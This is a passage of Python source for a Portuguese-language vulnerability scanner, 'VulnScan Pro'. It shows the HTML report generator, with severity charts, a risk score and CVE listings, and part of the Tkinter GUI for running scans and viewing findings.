        cc = defaultdict(int)
        for v in vulnerabilities:
            sc[v.severity] += 1
            cc[v.category] += 1

        total = len(vulnerabilities)
        crit = sc.get('CRÍTICA',0)
        high = sc.get('ALTA',0)
        med = sc.get('MÉDIA',0)
        low = sc.get('BAIXA',0)
        info = sc.get('INFO',0)

        risk = min(100, crit*25 + high*15 + med*8 + low*3 + info*1)
        if risk >= 75: rl, rc = "CRÍTICO", "#dc3545"
        elif risk >= 50: rl, rc = "ALTO", "#fd7e14"
        elif risk >= 25: rl, rc = "MÉDIO", "#ffc107"
        else: rl, rc = "BAIXO", "#28a745"

        total_cves = sum(len(v.cves) for v in vulnerabilities)
        unique_cves = list(set(c['id'] for v in vulnerabilities for c in v.cves))

        sl = json.dumps(['CRÍTICA','ALTA','MÉDIA','BAIXA','INFO'])
        sd = json.dumps([crit,high,med,low,info])
        scl = json.dumps(['#dc3545','#fd7e14','#ffc107','#28a745','#17a2b8'])
        cl = json.dumps(list(cc.keys()))
        cd = json.dumps(list(cc.values()))

        sm = {'CRÍTICA':'critical','ALTA':'high','MÉDIA':'medium','BAIXA':'low','INFO':'info'}
        im = {'CRÍTICA':'🔴','ALTA':'🟠','MÉDIA':'🟡','BAIXA':'🟢','INFO':'🔵'}
        so = {'CRÍTICA':0,'ALTA':1,'MÉDIA':2,'BAIXA':3,'INFO':4}

        vcards = ""
        for i, v in enumerate(sorted(vulnerabilities, key=lambda x: so.get(x.severity, 5))):
            c = sm.get(v.severity, 'info')
            icon = im.get(v.severity, '⚪')

            # CVE section
            cve_html = ""
            if v.cves:
                cve_html = '<div class="detail-section cve"><h4>📌 CVE Relacionadas</h4><div class="cve-list">'
                for cve in v.cves:
                    cve_html += (
                        f'<div class="cve-item">'
                        f'<span class="cve-id">{html_module.escape(cve["id"])}</span>'
                        f'<span class="cve-score">CVSS: {cve["score"]}</span>'
                        f'<p>{html_module.escape(cve["description"])}</p>'
                        f'<a href="{html_module.escape(cve["url"])}" target="_blank" class="cve-link">🔗 {html_module.escape(cve["url"])}</a>'
                    )
                    if 'exploit' in cve:
                        cve_html += f'<pre class="cve-exploit">{html_module.escape(cve["exploit"][:200])}</pre>'
                    cve_html += '</div>'
                cve_html += '</div></div>'

            vcards += f"""
            <div class="vuln-card {c}" id="vuln-{i}">
                <div class="vuln-header" onclick="toggleVuln('vd-{i}',this)">
                    <div class="vuln-title">
                        <span class="severity-badge {c}">{icon} {v.severity}</span>
                        <h3>{html_module.escape(v.name)}</h3>
                        <span class="cvss-badge">CVSS: {v.cvss_score}</span>
                        {'<span class="cve-count">' + str(len(v.cves)) + ' CVE</span>' if v.cves else ''}
                    </div>
                    <span class="vuln-category">{html_module.escape(v.category)}</span>
                    <span class="toggle-icon">▼</span>
                </div>
                <div class="vuln-detail" id="vd-{i}">
                    <div class="detail-section"><h4>📋 Descrição</h4><p>{html_module.escape(v.description)}</p></div>
                    <div class="detail-section evidence"><h4>🔍 Evidência</h4><pre>{html_module.escape(v.evidence)}</pre></div>
                    <div class="detail-section exploit"><h4>⚔️ Como Explorar</h4><pre>{html_module.escape(v.exploit_info)}</pre></div>
                    <div class="detail-section remediation"><h4>🛡️ Como Corrigir</h4><pre>{html_module.escape(v.remediation)}</pre></div>
                    {cve_html}
                    <div class="detail-section"><small>🕐 {v.timestamp}</small></div>
                </div>
            </div>"""

        trows = ""
        for i, v in enumerate(sorted(vulnerabilities, key=lambda x: so.get(x.severity, 5))):
            c = sm.get(v.severity, 'info')
            cve_count = f" ({len(v.cves)} CVE)" if v.cves else ""
            trows += f"""
            <tr onclick="document.getElementById('vuln-{i}').scrollIntoView({{behavior:'smooth'}});document.getElementById('vd-{i}').classList.add('active')">
                <td><span class="table-badge {c}">{v.severity}</span></td>
                <td>{html_module.escape(v.name)}{cve_count}</td>
                <td>{html_module.escape(v.category)}</td>
                <td>{v.cvss_score}</td>
            </tr>"""

        html_content = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>VulnScan Pro - {html_module.escape(scan_info.get('domain',''))}</title>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
<style>
:root{{--bg:#0a0e17;--bg2:#131a2b;--card:#1a2332;--text:#e4e8f0;--text2:#8892a4;--accent:#4f8cff;
--crit:#ff4757;--high:#ff6b35;--med:#ffc107;--low:#2ecc71;--info:#17a2b8;--border:#2a3548;--shadow:0 4px 24px rgba(0,0,0,0.3)}}
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);line-height:1.6}}
.container{{max-width:1400px;margin:0 auto;padding:20px}}
.report-header{{background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);padding:40px;border-radius:16px;margin-bottom:30px;border:1px solid var(--border)}}
.report-header h1{{font-size:2.5em;background:linear-gradient(90deg,#4f8cff,#a855f7);-webkit-background-clip:text;-webkit-text-fill-color:transparent}}
.report-header .subtitle{{color:var(--text2);font-size:1.1em;margin-bottom:20px}}
.header-info{{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:15px}}
.header-info-item{{background:rgba(255,255,255,0.05);padding:12px 18px;border-radius:10px;border:1px solid rgba(255,255,255,0.1)}}
.header-info-item label{{color:var(--text2);font-size:0.85em;display:block}}
.header-info-item span{{font-weight:600;font-size:1.05em;word-break:break-word}}
.dashboard{{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:16px;margin-bottom:30px}}
.stat-card{{background:var(--card);border-radius:12px;padding:20px;text-align:center;border:1px solid var(--border);transition:transform 0.3s}}
.stat-card:hover{{transform:translateY(-4px)}}
.stat-card .n{{font-size:2.8em;font-weight:800;line-height:1;margin:8px 0}}
.stat-card .l{{color:var(--text2);font-size:0.8em;text-transform:uppercase;letter-spacing:1px}}
.stat-card.critical .n{{color:var(--crit)}}.stat-card.high .n{{color:var(--high)}}
.stat-card.medium .n{{color:var(--med)}}.stat-card.low .n{{color:var(--low)}}
.stat-card.info .n{{color:var(--info)}}.stat-card.total .n{{color:var(--accent)}}
.stat-card.cve .n{{color:#a855f7}}
.risk-meter{{background:var(--card);border-radius:16px;padding:30px;margin-bottom:30px;border:1px solid var(--border);text-align:center}}
.risk-meter h2{{margin-bottom:15px;color:var(--accent)}}
.risk-score{{font-size:4em;font-weight:800;color:{rc}}}.risk-label{{font-size:1.5em;color:{rc};font-weight:700}}
.risk-bar{{width:100%;height:20px;background:linear-gradient(90deg,#2ecc71,#ffc107,#ff6b35,#ff4757);border-radius:10px;margin:15px 0;position:relative}}
.risk-indicator{{position:absolute;top:-8px;left:{min(risk,100)}%;width:4px;height:36px;background:white;border-radius:2px;box-shadow:0 0 10px rgba(255,255,255,0.5);transform:translateX(-50%)}}
.charts-section{{display:grid;grid-template-columns:repeat(auto-fit,minmax(400px,1fr));gap:20px;margin-bottom:30px}}
.chart-container{{background:var(--card);border-radius:16px;padding:24px;border:1px solid var(--border)}}
.chart-container h3{{margin-bottom:15px;color:var(--accent)}}
.chart-wrapper{{position:relative;height:350px}}
.table-section{{background:var(--card);border-radius:16px;padding:24px;margin-bottom:30px;border:1px solid var(--border);overflow-x:auto}}
.table-section h2{{margin-bottom:20px;color:var(--accent)}}
.filter-bar{{display:flex;gap:10px;margin-bottom:15px;flex-wrap:wrap}}
.filter-btn{{padding:8px 16px;border:1px solid var(--border);border-radius:8px;background:var(--bg2);color:var(--text);cursor:pointer;transition:all 0.3s;font-size:0.9em}}
.filter-btn:hover,.filter-btn.active{{background:var(--accent);border-color:var(--accent)}}
.search-box{{width:100%;padding:12px 20px;border-radius:10px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:1em;margin-bottom:20px;outline:none}}
.search-box:focus{{border-color:var(--accent)}}
table{{width:100%;border-collapse:collapse}}
th{{background:var(--bg2);padding:14px;text-align:left;font-weight:600;color:var(--accent);border-bottom:2px solid var(--border)}}
td{{padding:12px 14px;border-bottom:1px solid var(--border)}}
tr{{cursor:pointer;transition:background 0.2s}}tr:hover{{background:rgba(79,140,255,0.1)}}
.table-badge{{padding:4px 12px;border-radius:20px;font-size:0.8em;font-weight:700}}
.table-badge.critical{{background:rgba(255,71,87,0.2);color:var(--crit)}}
.table-badge.high{{background:rgba(255,107,53,0.2);color:var(--high)}}
.table-badge.medium{{background:rgba(255,193,7,0.2);color:var(--med)}}
.table-badge.low{{background:rgba(46,204,113,0.2);color:var(--low)}}
.table-badge.info{{background:rgba(23,162,184,0.2);color:var(--info)}}
.vulns-section{{margin-bottom:30px}}.vulns-section h2{{color:var(--accent);margin-bottom:20px;font-size:1.5em}}
.vuln-card{{background:var(--card);border-radius:12px;margin-bottom:16px;border:1px solid var(--border);overflow:hidden}}
.vuln-card.critical{{border-left:4px solid var(--crit)}}.vuln-card.high{{border-left:4px solid var(--high)}}
.vuln-card.medium{{border-left:4px solid var(--med)}}.vuln-card.low{{border-left:4px solid var(--low)}}
.vuln-card.info{{border-left:4px solid var(--info)}}
.vuln-header{{padding:18px 24px;cursor:pointer;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px}}
.vuln-header:hover{{background:rgba(255,255,255,0.03)}}
.vuln-title{{display:flex;align-items:center;gap:12px;flex:1;flex-wrap:wrap}}
.vuln-title h3{{font-size:1.05em;font-weight:600}}
.severity-badge{{padding:4px 14px;border-radius:20px;font-size:0.75em;font-weight:700;white-space:nowrap}}
.severity-badge.critical{{background:rgba(255,71,87,0.2);color:var(--crit)}}
.severity-badge.high{{background:rgba(255,107,53,0.2);color:var(--high)}}
.severity-badge.medium{{background:rgba(255,193,7,0.2);color:var(--med)}}
.severity-badge.low{{background:rgba(46,204,113,0.2);color:var(--low)}}
.severity-badge.info{{background:rgba(23,162,184,0.2);color:var(--info)}}
.cvss-badge{{background:rgba(79,140,255,0.2);color:var(--accent);padding:3px 10px;border-radius:15px;font-size:0.8em;font-weight:600}}
.cve-count{{background:rgba(168,85,247,0.2);color:#a855f7;padding:3px 10px;border-radius:15px;font-size:0.8em;font-weight:600}}
.vuln-category{{color:var(--text2);font-size:0.85em}}
.toggle-icon{{font-size:1.2em;color:var(--text2)}}
.vuln-detail{{display:none;padding:0 24px 24px}}.vuln-detail.active{{display:block}}
.detail-section{{margin-bottom:20px}}.detail-section h4{{color:var(--accent);margin-bottom:10px}}
.detail-section p{{line-height:1.7}}
.detail-section pre{{background:var(--bg);padding:16px;border-radius:8px;overflow-x:auto;font-size:0.88em;line-height:1.6;border:1px solid var(--border);color:#c5d0e0;white-space:pre-wrap;word-wrap:break-word;font-family:'Consolas',monospace}}
.detail-section.evidence pre{{border-left:3px solid var(--med)}}
.detail-section.exploit pre{{border-left:3px solid var(--crit)}}
.detail-section.remediation pre{{border-left:3px solid var(--low)}}
.detail-section.cve pre{{border-left:3px solid #a855f7}}
.cve-list{{display:flex;flex-direction:column;gap:12px}}
.cve-item{{background:rgba(168,85,247,0.08);border:1px solid rgba(168,85,247,0.3);border-radius:10px;padding:15px}}
.cve-id{{font-weight:700;color:#a855f7;font-size:1.1em;margin-right:10px}}
.cve-score{{background:rgba(255,71,87,0.2);color:var(--crit);padding:2px 8px;border-radius:10px;font-size:0.8em;font-weight:700}}
.cve-item p{{margin:8px 0;color:var(--text)}}
.cve-link{{color:var(--accent);text-decoration:none;font-size:0.9em;word-break:break-word}}
.cve-link:hover{{text-decoration:underline}}
.cve-exploit{{background:var(--bg)!important;padding:10px!important;margin-top:8px;font-size:0.85em!important;border-left:3px solid #a855f7!important}}
.report-footer{{text-align:center;padding:30px;color:var(--text2);border-top:1px solid var(--border);margin-top:40px}}
.back-to-top{{position:fixed;bottom:30px;right:30px;width:50px;height:50px;border-radius:50%;background:var(--accent);color:white;border:none;font-size:1.5em;cursor:pointer;display:none;z-index:1000}}
@media(max-width:768px){{.report-header h1{{font-size:1.8em}}.dashboard{{grid-template-columns:repeat(2,1fr)}}.charts-section{{grid-template-columns:1fr}}}}
@media print{{body{{background:white;color:black}}.vuln-detail{{display:block!important}}.filter-bar,.back-to-top{{display:none}}}}
</style>
</head>
<body>
<button class="back-to-top" id="btt" onclick="window.scrollTo({{top:0,behavior:'smooth'}})">↑</button>
<div class="container">

<div class="report-header">
<h1>🔍 VulnScan Pro</h1>
<p class="subtitle">Relatório de Vulnerabilidades com CVE e Recomendações</p>
<div class="header-info">
<div class="header-info-item"><label>🎯 Alvo</label><span>{html_module.escape(str(scan_info.get('domain','N/A')))}</span></div>
<div class="header-info-item"><label>🔗 URL</label><span>{html_module.escape(str(scan_info.get('url','N/A')))}</span></div>
<div class="header-info-item"><label>🌐 IP</label><span>{html_module.escape(str(scan_info.get('ip','N/A')))}</span></div>
<div class="header-info-item"><label>📅 Data</label><span>{html_module.escape(str(scan_info.get('scan_date','N/A')))}</span></div>
<div class="header-info-item"><label>⏱️ Duração</label><span>{html_module.escape(str(scan_info.get('duration','N/A')))}</span></div>
<div class="header-info-item"><label>🖥️ Servidor</label><span>{html_module.escape(str(scan_info.get('server','N/A')))}</span></div>
</div>
</div>

<div class="risk-meter">
<h2>⚡ Nível de Risco</h2>
<div class="risk-score">{risk}/100</div>
<div class="risk-label">{rl}</div>
<div class="risk-bar"><div class="risk-indicator"></div></div>
</div>

<div class="dashboard">
<div class="stat-card total"><div class="l">Total</div><div class="n">{total}</div><div class="l">Vulns</div></div>
<div class="stat-card critical"><div class="l">🔴 Crítica</div><div class="n">{crit}</div></div>
<div class="stat-card high"><div class="l">🟠 Alta</div><div class="n">{high}</div></div>
<div class="stat-card medium"><div class="l">🟡 Média</div><div class="n">{med}</div></div>
<div class="stat-card low"><div class="l">🟢 Baixa</div><div class="n">{low}</div></div>
<div class="stat-card info"><div class="l">🔵 Info</div><div class="n">{info}</div></div>
<div class="stat-card cve"><div class="l">📌 CVE</div><div class="n">{len(unique_cves)}</div><div class="l">Referenciadas</div></div>
</div>

<div class="charts-section">
<div class="chart-container"><h3>📊 Por Severidade</h3><div class="chart-wrapper"><canvas id="c1"></canvas></div></div>
<div class="chart-container"><h3>📈 Por Categoria</h3><div class="chart-wrapper"><canvas id="c2"></canvas></div></div>
<div class="chart-container"><h3>🎯 Radar</h3><div class="chart-wrapper"><canvas id="c3"></canvas></div></div>
<div class="chart-container"><h3>📉 Polar</h3><div class="chart-wrapper"><canvas id="c4"></canvas></div></div>
</div>

<div class="table-section">
<h2>📋 Resumo ({total} vulnerabilidades | {len(unique_cves)} CVE)</h2>
<div class="filter-bar">
<button class="filter-btn active" onclick="fv('all',this)">Todas ({total})</button>
<button class="filter-btn" onclick="fv('CRÍTICA',this)">🔴 ({crit})</button>
<button class="filter-btn" onclick="fv('ALTA',this)">🟠 ({high})</button>
<button class="filter-btn" onclick="fv('MÉDIA',this)">🟡 ({med})</button>
<button class="filter-btn" onclick="fv('BAIXA',this)">🟢 ({low})</button>
<button class="filter-btn" onclick="fv('INFO',this)">🔵 ({info})</button>
</div>
<input type="text" class="search-box" placeholder="🔍 Buscar..." oninput="st(this.value)">
<table id="vt"><thead><tr><th>Severidade</th><th>Vulnerabilidade</th><th>Categoria</th><th>CVSS</th></tr></thead>
<tbody>{trows}</tbody></table>
</div>

<div class="vulns-section">
<h2>🔎 Detalhes Completos</h2>
<input type="text" class="search-box" placeholder="🔍 Buscar detalhes..." oninput="sd(this.value)">
{vcards}
</div>

<div class="report-footer">
<p>📊 <strong>VulnScan Pro</strong> | {scan_info.get('scan_date','N/A')} | {total} vulns | {len(unique_cves)} CVE</p>
<p>⚠️ Uso autorizado e ético obrigatório</p>
</div>
</div>

<script>
const o={{responsive:true,maintainAspectRatio:false}};
new Chart(document.getElementById('c1'),{{type:'doughnut',data:{{labels:{sl},datasets:[{{data:{sd},backgroundColor:{scl},borderColor:'#1a2332',borderWidth:3}}]}},options:{{...o,plugins:{{legend:{{position:'bottom',labels:{{color:'#e4e8f0'}}}}}},cutout:'60%'}}}});
new Chart(document.getElementById('c2'),{{type:'bar',data:{{labels:{cl},datasets:[{{label:'Vulns',data:{cd},backgroundColor:'rgba(79,140,255,0.6)',borderColor:'rgba(79,140,255,1)',borderWidth:1,borderRadius:6}}]}},options:{{...o,indexAxis:'y',plugins:{{legend:{{display:false}}}},scales:{{x:{{grid:{{color:'rgba(42,53,72,0.5)'}},ticks:{{color:'#8892a4',stepSize:1}}}},y:{{grid:{{display:false}},ticks:{{color:'#e4e8f0'}}}}}}}}}});
const rl={cl};new Chart(document.getElementById('c3'),{{type:'radar',data:{{labels:rl.map(l=>l.length>15?l.substring(0,15)+'...':l),datasets:[{{label:'Vulns',data:{cd},backgroundColor:'rgba(79,140,255,0.2)',borderColor:'rgba(79,140,255,1)',borderWidth:2,pointBackgroundColor:'rgba(79,140,255,1)'}}]}},options:{{...o,plugins:{{legend:{{display:false}}}},scales:{{r:{{grid:{{color:'rgba(42,53,72,0.5)'}},ticks:{{display:false}},pointLabels:{{color:'#e4e8f0'}}}}}}}}}});
new Chart(document.getElementById('c4'),{{type:'polarArea',data:{{labels:{sl},datasets:[{{data:{sd},backgroundColor:['rgba(255,71,87,0.6)','rgba(255,107,53,0.6)','rgba(255,193,7,0.6)','rgba(46,204,113,0.6)','rgba(23,162,184,0.6)']}}]}},options:{{...o,plugins:{{legend:{{position:'bottom',labels:{{color:'#e4e8f0'}}}}}},scales:{{r:{{grid:{{color:'rgba(42,53,72,0.5)'}},ticks:{{display:false}}}}}}}}}});
function toggleVuln(id,el){{const d=document.getElementById(id);const i=el.querySelector('.toggle-icon');d.classList.toggle('active');i.textContent=d.classList.contains('active')?'▲':'▼'}}
function fv(s,b){{document.querySelectorAll('.filter-btn').forEach(x=>x.classList.remove('active'));b.classList.add('active');document.querySelectorAll('#vt tbody tr').forEach(r=>{{if(s==='all')r.style.display='';else{{const t=r.querySelector('.table-badge');r.style.display=t&&t.textContent.trim()===s?'':'none'}}}})}}
function st(q){{q=q.toLowerCase();document.querySelectorAll('#vt tbody tr').forEach(r=>r.style.display=r.textContent.toLowerCase().includes(q)?'':'none')}}
function sd(q){{q=q.toLowerCase();document.querySelectorAll('.vuln-card').forEach(c=>c.style.display=c.textContent.toLowerCase().includes(q)?'':'none')}}
window.addEventListener('scroll',()=>{{document.getElementById('btt').style.display=window.scrollY>300?'block':'none'}});
window.addEventListener('beforeprint',()=>{{document.querySelectorAll('.vuln-detail').forEach(d=>d.classList.add('active'))}});
</script>
</body></html>"""

        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        return filename


# ==================== INTERFACE GRÁFICA ====================

class VulnScanGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("🔍 VulnScan Pro")      

        try:
            if platform.system() == "Windows":
                self.root.after(100, lambda: self.root.state("zoomed"))
            else:
                self.root.after(200, lambda: self.root.attributes("-zoomed", True))
        except Exception:
            pass

        self.bg = "#0d1117"
        self.fg = "#e6edf3"
        self.accent = "#4f8cff"
        self.card = "#161b22"
        self.border = "#30363d"

        self.root.configure(bg=self.bg)
        self.scanner = None
        self.is_scanning = False

        self._setup_styles()
        self._create_widgets()
        self._center()

    def _setup_styles(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('Accent.TButton', background=self.accent, foreground='white',
                        font=('Segoe UI', 11, 'bold'), padding=(20, 10))
        style.map('Accent.TButton', background=[('active','#6ba0ff'),('disabled','#30363d')])
        style.configure('Stop.TButton', background='#da3633', foreground='white',
                        font=('Segoe UI', 11, 'bold'), padding=(20, 10))
        style.map('Stop.TButton', background=[('active','#f85149')])
        style.configure('Save.TButton', background='#238636', foreground='white',
                        font=('Segoe UI', 11, 'bold'), padding=(20, 10))
        style.map('Save.TButton', background=[('active','#2ea043')])
        style.configure("Custom.Horizontal.TProgressbar", troughcolor=self.card,
                        background=self.accent, darkcolor=self.accent, lightcolor=self.accent)
        style.configure("Treeview", background="#0d1117", foreground="#c9d1d9",
                        fieldbackground="#0d1117", font=('Segoe UI', 9), rowheight=26)
        style.configure("Treeview.Heading", background="#21262d", foreground="#58a6ff",
                        font=('Segoe UI', 9, 'bold'))
        style.map("Treeview", background=[('selected', '#1f6feb')])

    def _center(self):
        self.root.update_idletasks()
        x = (self.root.winfo_screenwidth()//2) - (self.root.winfo_width()//2)
        y = (self.root.winfo_screenheight()//2) - (self.root.winfo_height()//2)
        self.root.geometry(f'+{x}+{y}')

    def _create_widgets(self):
        main = tk.Frame(self.root, bg=self.bg)
        main.pack(fill=tk.BOTH, expand=True, padx=20, pady=15)

        # Header
        hdr = tk.Frame(main, bg=self.bg)
        hdr.pack(fill=tk.X, pady=(0,12))
        tk.Label(hdr, text="🔍 VulnScan Pro", bg=self.bg, fg=self.accent,
                 font=('Segoe UI', 24, 'bold')).pack(anchor='w')
        tk.Label(hdr, text="Scanner Profissional | Barra 0-100% | CVE Links | Relatório HTML",
                 bg=self.bg, fg='#8b949e', font=('Segoe UI', 11)).pack(anchor='w')

        # Input card
        ic = tk.Frame(main, bg=self.card, highlightbackground=self.border,
                      highlightthickness=1, padx=20, pady=15)
        ic.pack(fill=tk.X, pady=(0,12))

        top = tk.Frame(ic, bg=self.card)
        top.pack(fill=tk.X)
        tk.Label(top, text="🎯 Alvo:", bg=self.card, fg=self.fg,
                 font=('Segoe UI', 11, 'bold')).pack(side=tk.LEFT, padx=(0,10))

        self.target_entry = tk.Entry(top, font=('Consolas', 13), bg=self.bg, fg=self.fg,
                                     insertbackground=self.fg, relief='flat',
                                     highlightthickness=1, highlightbackground=self.border,
                                     highlightcolor=self.accent)
        self.target_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=8, padx=(0,15))
        self.target_entry.insert(0, "exemplo.com.br")
        self.target_entry.bind('<FocusIn>', lambda e: self.target_entry.select_range(0, tk.END))
        self.target_entry.bind('<Return>', lambda e: self.start_scan())

        btns = tk.Frame(top, bg=self.card)
        btns.pack(side=tk.RIGHT)
        self.scan_btn = ttk.Button(btns, text="⚡ Scan", style='Accent.TButton', command=self.start_scan)
        self.scan_btn.pack(side=tk.LEFT, padx=(0,6))
        self.stop_btn = ttk.Button(btns, text="⛔ Parar", style='Stop.TButton', command=self.stop_scan)
        self.stop_btn.pack(side=tk.LEFT, padx=(0,6))
        self.stop_btn.state(['disabled'])
        self.save_btn = ttk.Button(btns, text="💾 HTML", style='Save.TButton', command=self.save_report)
        self.save_btn.pack(side=tk.LEFT)
        self.save_btn.state(['disabled'])

        # Progress bar - DETERMINISTIC 0-100%
        pf = tk.Frame(ic, bg=self.card)
        pf.pack(fill=tk.X, pady=(10,0))

        self.progress_var = tk.DoubleVar(value=0)
        self.progress = ttk.Progressbar(pf, mode='determinate', variable=self.progress_var,
                                         maximum=100, style="Custom.Horizontal.TProgressbar")
        self.progress.pack(fill=tk.X, side=tk.LEFT, expand=True, padx=(0,10))

        self.progress_label = tk.Label(pf, text="0%", bg=self.card, fg=self.accent,
                                        font=('Segoe UI', 12, 'bold'), width=5)
        self.progress_label.pack(side=tk.RIGHT)

        # Status
        sf = tk.Frame(ic, bg=self.card)
        sf.pack(fill=tk.X, pady=(5,0))
        self.status_var = tk.StringVar(value="Pronto para iniciar")
        self.module_var = tk.StringVar(value="")
        tk.Label(sf, textvariable=self.status_var, bg=self.card, fg='#8b949e',
                 font=('Segoe UI', 9)).pack(side=tk.LEFT)
        tk.Label(sf, textvariable=self.module_var, bg=self.card, fg=self.accent,
                 font=('Segoe UI', 9, 'bold')).pack(side=tk.RIGHT)

        # Paned window
        paned = tk.PanedWindow(main, orient=tk.HORIZONTAL, bg=self.bg,
                                sashwidth=6, sashrelief='flat')
        paned.pack(fill=tk.BOTH, expand=True)

        # LEFT - Log
        log_f = tk.Frame(paned, bg=self.card, highlightbackground=self.border,
                          highlightthickness=1)
        paned.add(log_f, width=620, minsize=300)

        lh = tk.Frame(log_f, bg=self.card)
        lh.pack(fill=tk.X, padx=15, pady=(12,5))
        tk.Label(lh, text="📋 Log do Scan", bg=self.card, fg=self.accent,
                 font=('Segoe UI', 12, 'bold')).pack(side=tk.LEFT)
        tk.Button(lh, text="🗑️", bg=self.card, fg='#8b949e', font=('Segoe UI', 9),
                  relief='flat', cursor='hand2', command=self.clear_log).pack(side=tk.RIGHT)

        self.log_text = scrolledtext.ScrolledText(log_f, bg='#010409', fg='#c9d1d9',
                                                   font=('Consolas', 10), relief='flat',
                                                   wrap=tk.WORD, padx=10, pady=10)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0,10))
        self.log_text.tag_configure('VULN', foreground='#f85149')
        self.log_text.tag_configure('INFO', foreground='#58a6ff')
        self.log_text.tag_configure('ERROR', foreground='#f0883e')
        self.log_text.tag_configure('SUCCESS', foreground='#3fb950')
        self.log_text.tag_configure('HEADER', foreground='#d2a8ff', font=('Consolas', 10, 'bold'))
        self.log_text.tag_configure('CVE', foreground='#a855f7')

        # RIGHT - Results
        res_f = tk.Frame(paned, bg=self.card, highlightbackground=self.border,
                          highlightthickness=1)
        paned.add(res_f, minsize=300)

        rh = tk.Frame(res_f, bg=self.card)
        rh.pack(fill=tk.X, padx=15, pady=(12,5))
        tk.Label(rh, text="🔎 Vulnerabilidades", bg=self.card, fg=self.accent,
                 font=('Segoe UI', 12, 'bold')).pack(side=tk.LEFT)
        self.vuln_count = tk.StringVar(value="0")
        tk.Label(rh, textvariable=self.vuln_count, bg=self.card, fg='#8b949e',
                 font=('Segoe UI', 10)).pack(side=tk.RIGHT)

        # Stats
        stats = tk.Frame(res_f, bg=self.card)
        stats.pack(fill=tk.X, padx=15, pady=(5,8))
        self.stat_vars = {}
        colors = {'CRÍTICA':'#f85149','ALTA':'#f0883e','MÉDIA':'#d29922',
                  'BAIXA':'#3fb950','INFO':'#58a6ff'}
        for sev, color in colors.items():
            f = tk.Frame(stats, bg='#21262d', padx=6, pady=3,
                         highlightbackground=color, highlightthickness=1)
            f.pack(side=tk.LEFT, padx=2, expand=True, fill=tk.X)
            self.stat_vars[sev] = tk.StringVar(value="0")
            tk.Label(f, textvariable=self.stat_vars[sev], bg='#21262d', fg=color,
                     font=('Segoe UI', 14, 'bold')).pack()
            tk.Label(f, text=sev, bg='#21262d', fg='#8b949e',
                     font=('Segoe UI', 7)).pack()

        # Tree
        tf = tk.Frame(res_f, bg=self.card)
        tf.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0,8))
        self.tree = ttk.Treeview(tf, columns=('sev','name','cat','cvss'),
                                  show='headings', selectmode='browse')
        self.tree.heading('sev', text='Sev')
        self.tree.heading('name', text='Vulnerabilidade')
        self.tree.heading('cat', text='Categoria')
        self.tree.heading('cvss', text='CVSS')
        self.tree.column('sev', width=80)
        self.tree.column('name', width=230)
        self.tree.column('cat', width=110)
        self.tree.column('cvss', width=55)
        sb = ttk.Scrollbar(tf, orient='vertical', command=self.tree.yview)
        self.tree.configure(yscrollcommand=sb.set)
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        sb.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.bind('<<TreeviewSelect>>', self.on_select)

        # Detail
        self.detail = scrolledtext.ScrolledText(res_f, bg='#010409', fg='#c9d1d9',
                                                 font=('Consolas', 9), relief='flat',
                                                 wrap=tk.WORD, padx=10, pady=10, height=12)
        self.detail.pack(fill=tk.X, padx=10, pady=(0,10))
        self.detail.tag_configure('CVE', foreground='#a855f7', font=('Consolas', 9, 'bold'))
        self.detail.tag_configure('LINK', foreground='#58a6ff', underline=True)

    def log_msg(self, msg):
        self.log_text.config(state='normal')
        tag = 'INFO'
        if '[VULN]' in msg: tag = 'VULN'
        elif '[ERROR]' in msg: tag = 'ERROR'
        elif '✅' in msg: tag = 'SUCCESS'
        elif '═' in msg or '─' in msg or '📌' in msg: tag = 'HEADER'
        elif 'CVE' in msg: tag = 'CVE'
        self.log_text.insert(tk.END, msg + '\n', tag)
        self.log_text.see(tk.END)
        self.log_text.config(state='disabled')

        if self.scanner:
            sc = defaultdict(int)
            for v in self.scanner.vulnerabilities:
                sc[v.severity] += 1
            for s, var in self.stat_vars.items():
                var.set(str(sc.get(s, 0)))
            self.vuln_count.set(f"{len(self.scanner.vulnerabilities)} vulns")
            if '[VULN]' in msg:
                self._update_tree()

    def progress_update(self, pct, total, current):
        self.root.after(0, self._do_progress_update, pct, total, current)

    def _do_progress_update(self, pct, total, current):
        self.progress_var.set(pct)
        self.progress_label.config(text=f"{pct}%")
        self.module_var.set(f"Módulo {current}/{total}")

        # Cor baseada no progresso
        if pct >= 100:
            self.progress_label.config(fg='#3fb950')
        elif pct >= 75:
            self.progress_label.config(fg='#ffc107')
        elif pct >= 50:
            self.progress_label.config(fg='#fd7e14')
        else:
            self.progress_label.config(fg=self.accent)

    def _update_tree(self):
        self.tree.delete(*self.tree.get_children())
        order = {'CRÍTICA':0,'ALTA':1,'MÉDIA':2,'BAIXA':3,'INFO':4}
        icons = {'CRÍTICA':'🔴','ALTA':'🟠','MÉDIA':'🟡','BAIXA':'🟢','INFO':'🔵'}
        for v in sorted(self.scanner.vulnerabilities, key=lambda x: order.get(x.severity, 5)):
            name = v.name
            if v.cves:
                name += f" [{len(v.cves)} CVE]"
            self.tree.insert('', tk.END, values=(
                f"{icons.get(v.severity,'⚪')} {v.severity}",
                name, v.category, v.cvss_score
            ))

    def on_select(self, e):
        sel = self.tree.selection()
        if not sel: return
        vals = self.tree.item(sel[0])['values']
        raw_name = vals[1]
        # Remove CVE count from display name for matching
        search_name = re.sub(r'\s*\[\d+ CVE\]$', '', raw_name)

        for v in self.scanner.vulnerabilities:
            if v.name == search_name:
                self.detail.config(state='normal')
                self.detail.delete('1.0', tk.END)

                d = (f"═══ {v.name} ═══\n\n"
